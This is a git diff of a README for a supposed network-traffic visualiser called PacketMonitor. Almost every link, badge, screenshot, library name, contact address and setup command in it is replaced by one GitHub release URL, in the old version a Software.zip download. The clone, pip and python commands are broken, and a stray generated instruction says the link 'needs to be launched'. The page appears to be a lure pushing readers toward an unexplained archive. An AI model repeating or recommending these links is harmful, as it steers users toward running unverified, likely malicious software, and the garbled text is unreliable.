@@ -1,45 +1,45 @@
 # 🌐🛰️ PacketMonitor 
-![Python](https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip)
-![Flask](https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip)
-![Scapy](https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip)
-![https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip](https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip)  
+![Python](https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0)
+![Flask](https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0)
+![Scapy](https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0)
+![https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0](https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0)  
 
 Welcome to PacketMonitor!  
-This project visualizes live network traffic using Flask, WebSockets, Scapy, and https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip It captures network packets, retrieves geolocation data, and displays them dynamically on a real-time map.
+This project visualizes live network traffic using Flask, WebSockets, Scapy, and https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0 It captures network packets, retrieves geolocation data, and displays them dynamically on a real-time map.
 
 ## 📁 Repository  
 - **Repository Name:** PacketMonitor  
-- **Description:** This project visualizes live network traffic using Flask, WebSockets, Scapy, and https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip It captures network packets, retrieves geolocation data, and displays them dynamically on a real-time map.  
+- **Description:** This project visualizes live network traffic using Flask, WebSockets, Scapy, and https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0 It captures network packets, retrieves geolocation data, and displays them dynamically on a real-time map.  
 - **Topics:** flask, geolocation, leaflet, map, network-traffic, packet-capture, packets, real-time, realtime, realtime-map, scapy, websockets  
 
 ## 🚀 Quick Start  
 To start using PacketMonitor, follow these steps:  
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip
+   git clone https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0
    ```  
 2. Navigate to the project directory.  
 3. Install the required dependencies:  
    ```bash
-   pip install -r https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip
+   pip install -r https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0
    ```  
 4. Run the Flask application:  
    ```bash
-   python https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip
+   python https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0
    ```  
 
 ## 🧰 Technologies Used  
 - **Flask** - A micro web framework for Python.  
 - **WebSockets** - Communication protocol that provides full-duplex communication channels over a single TCP connection.  
 - **Scapy** - Powerful interactive packet manipulation program.  
-- **https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip** - Leading open-source JavaScript library for mobile-friendly interactive maps.  
+- **https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0** - Leading open-source JavaScript library for mobile-friendly interactive maps.  
 
 ## 📊 Demo  
-Check out our live demo [here](https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip).  
+Check out our live demo [here](https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0).  
 3. If the link ends with a file name then write it needs to be launched.
 
 ## 🖼️ Screenshots  
-![Map](https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip)  
+![Map](https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0)  
 *Real-time map capturing network packets.*  
 
 ## 📈 Future Improvements  
@@ -60,9 +60,9 @@ We welcome contributions to PacketMonitor! To contribute, follow these steps:
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## 📞 Contact  
-For any inquiries or support, please contact us at https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip
+For any inquiries or support, please contact us at https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0
 
 ## 🌟 Thank You  
 Thank you for checking out PacketMonitor! We hope this project helps you visualize and monitor live network traffic effectively. Happy monitoring! 
 
-🔗 Check the [Releases](https://github.com/Damir3dx/PacketMonitor/releases/download/v1.0/Software.zip) section for more information.
+🔗 Check the [Releases](https://github.com/Damir3dx/PacketMonitor/releases/tag/v2.0) section for more information.
